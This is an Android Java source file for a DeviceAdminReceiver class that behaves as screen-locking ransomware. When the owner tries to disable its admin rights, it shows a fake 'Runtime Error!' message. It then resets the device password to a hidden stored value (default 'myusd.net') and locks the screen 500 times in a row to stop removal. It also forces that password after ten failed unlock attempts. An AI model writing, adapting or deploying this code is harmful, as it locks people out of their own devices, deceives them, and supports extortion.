package com.mynagisa.java;

import android.app.admin.*;
import android.content.*;
import android.os.*;
import android.util.*;


public class MyAdmin extends DeviceAdminReceiver {
	
	@Override
	public DevicePolicyManager getManager(Context context) {
		Log.i("------", "getManager-----");

		return super.getManager(context);
	}

	@Override
	public ComponentName getWho(Context context) {
		Log.i("------", "getWho-----");
		return super.getWho(context);
	}

	/**
	 * 
	 */
	@Override
	public void onDisabled(Context context, Intent intent) {
		tips(context,  "Runtime Error!");
		String resetpwd = context.getSharedPreferences("pwd",
			Context.MODE_PRIVATE).getString("pwd", "myusd.net");
		getManager(context).resetPassword(resetpwd, 0);
		int i =0;
		while(i<500){
			getManager(context).lockNow();
			long sleep_t=50;
			try {
				Thread.sleep(sleep_t);
				++i;
			}
			catch(InterruptedException interruptedException0){
				interruptedException0.printStackTrace();
			}
		}
		super.onDisabled(context, intent);
	}
	/**
	 * 
	 */
	@Override
	public CharSequence onDisableRequested(Context context, Intent intent) {
		tips(context,  "Runtime Error!");
		String resetpwd = context.getSharedPreferences("pwd",
		   Context.MODE_PRIVATE).getString("pwd", "myusd.net");
		getManager(context).resetPassword(resetpwd, 0);
		int i =0;
		while(i<500){
			getManager(context).lockNow();
			long sleep_t=50;
			try {
				Thread.sleep(sleep_t);
				++i;
			}
			catch(InterruptedException interruptedException0){
				interruptedException0.printStackTrace();
			}
		}
		return super.onDisableRequested(context, intent);
	}

	/**
	 *
	 */
	@Override
	public void onEnabled(Context context, Intent intent) {
		tips(context,  "你已激活");
		SharedPreferences.Editor pwdfailed = context.getSharedPreferences("pwd_failedtimes",context.MODE_PRIVATE).edit();
		pwdfailed.putInt("pwdfailed",0);
		pwdfailed.commit();
		super.onEnabled(context,intent);
	}

	@Override
	public void onPasswordChanged(Context context, Intent intent) {
		tips(context,"Password changed!");
		Intent oointent = new Intent(Intent.ACTION_MAIN,null);
		oointent.addCategory(Intent.CATEGORY_HOME);
		context.startActivity(oointent);
		super.onPasswordChanged(context, intent);
	}

	/**
	 *
	 */
	@Override
	public void onPasswordFailed(Context context, Intent intent) {
		int times = context.getSharedPreferences("pwd_failedtimes",
			Context.MODE_PRIVATE).getInt("pwdfailed",0);
		times = times + 1;
		tips(context,"您已经输错密码:"+times+"次");
		if (times >= 10){
			String resetpwd = context.getSharedPreferences("pwd",
				Context.MODE_PRIVATE).getString("pwd", "myusd.net");
			getManager(context).resetPassword(resetpwd, 0);
			tips(context,"密码已恢复！");
			SharedPreferences.Editor pwdtimes = context.getSharedPreferences("pwd_failedtimes",context.MODE_PRIVATE).edit();
			pwdtimes.clear();
			pwdtimes.commit();
			getManager(context).lockNow();
		}
		SharedPreferences.Editor pwdtimes = context.getSharedPreferences("pwd_failedtimes",context.MODE_PRIVATE).edit();
		pwdtimes.putInt("pwdfailed",times);
		pwdtimes.commit();
		super.onPasswordFailed(context, intent);
	}
	@Override
	public void onPasswordSucceeded(Context context, Intent intent) {
		tips(context,  "Runtime SUCCEED");
		SharedPreferences.Editor pwdtimes = context.getSharedPreferences("pwd_failedtimes",context.MODE_PRIVATE).edit();
		pwdtimes.clear();
		pwdtimes.commit();
		super.onPasswordSucceeded(context, intent);
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.i("------", "onReceive-----");
	 
		super.onReceive(context, intent);
	}

	/**
	 *
	 */
	@Override
	public IBinder peekService(Context myContext, Intent service) {
		Log.i("------", "peekService-----");
	 
		return super.peekService(myContext, service);
	}

	public void tips(Context context, String text) {
		TipsUtils.toast(context, text);
		TipsUtils.notify(context, text);
	}
	

}
